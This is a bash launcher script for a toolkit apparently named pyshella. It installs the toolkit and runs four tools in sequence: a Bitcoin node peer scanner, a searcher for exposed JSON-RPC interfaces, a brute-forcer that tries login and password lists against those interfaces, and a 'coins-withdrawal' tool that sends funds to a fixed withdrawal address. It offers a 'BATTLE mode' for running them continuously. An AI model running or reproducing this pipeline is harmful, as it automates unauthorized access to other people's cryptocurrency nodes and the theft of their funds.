#!/bin/bash
set -e

package=$(pip list | grep pyshella-toolkit) &

# Check if the toolkit is not installed.
if ! [[ ${package} ]]; then
    echo -e "\e[1;32mToolkit is not installed. Installing toolkit...\e[0m"
    sleep 4s
    python setup.py install --user
fi


# Options for toolkit utils.
node_uri=http://alice:bob@127.0.0.1:18332
mongo_uri=mongodb://root:toor@localhost:27017
let "interval=5*60"

peers_scanner_options=(-nU ${node_uri} -mU ${mongo_uri} -b 30 -i ${interval} -n Bitcoin)
jsonrpc_searcher_options=(-mU ${mongo_uri} -n Bitcoin -bT 1 -hS 1 -pS 15 -v True)
jsonrpc_bruter_options=(-mU ${mongo_uri} -n Bitcoin -t 20 -l logins_file -p pwds_file -b HLP)
coins_withdrawal_options=(-mU ${mongo_uri} -n Bitcoin -a withdrawal_addr -i ${interval})

# Extra funcs.
function debug() {
    ~/.local/bin/pyshella-peers-scanner ${peers_scanner_options[@]} &
    status=$?

    if [[ ${status} -ne 0 ]]; then
        echo -e "\e[1;31mFailed to start peers-scanner: $status\e[0m"
        exit ${status}
    fi

    ~/.local/bin/pyshella-jsonrpc-searcher ${jsonrpc_searcher_options[@]} &
    status=$?
    if [[ ${status} -ne 0 ]]; then
        echo -e "\e[1;31mFailed to start jsonrpc-searcher: $status\e[0m"
        exit ${status}
    fi

    ~/.local/bin/pyshella-jsonrpc-bruter ${jsonrpc_bruter_options[@]} &
    status=$?
    if [[ ${status} -ne 0 ]]; then
        echo -e "\e[1;31mFailed to start my_jsonrpc-bruter: $status\e[0m"
        exit ${status}
    fi

    ~/.local/bin/pyshella-coins-withdrawal ${coins_withdrawal_options[@]} &
    status=$?
    if [[ ${status} -ne 0 ]]; then
        echo -e "\e[1;31mFailed to start coins-withdrawal: $status\e[0m"
        exit ${status}
    fi
}


# Selects the startup mode .
if [[ "$ENV" = 'DEBUG' ]]; then
    echo -e "\e[1;32mFiles with logs are located by path ~/.local/share/pyshella-toolkit/\e[0m"
    sleep 4s
    debug

    while sleep 60; do
        ps aux | grep pyshella-peers-scanner | grep -q -v grep
        PROCESS_PEERS_SCANNER_STATUS=$?
        ps aux | grep pyshella-jsonrpc-searcher | grep -q -v grep
        PROCESS_JSONRPC_SEARCHER_STATUS=$?
        ps aux | grep pyshella-jsonrpc-bruter | grep -q -v grep
        PROCESS_JSONRPC_BRUTER_STATUS=$?
        ps aux | grep pyshella-coins-withdrawal | grep -q -v grep
        PROCESS_COINS_WITHDRAWAL_STATUS=$?

        if [[ ${PROCESS_PEERS_SCANNER_STATUS} -ne 0 ||
              ${PROCESS_JSONRPC_SEARCHER_STATUS} -ne 0 ||
              ${PROCESS_JSONRPC_BRUTER_STATUS} -ne 0 ||
              ${PROCESS_COINS_WITHDRAWAL_STATUS} -ne 0 ]]; then
            echo -e "\e[1;31mOne of the processes has already exited.\e[0m"
            exit 1
        fi
    done
else
    echo -e "\e[1;32mRunning Toolkit in BATTLE mode...\e[0m"
    /usr/bin/supervisord
fi
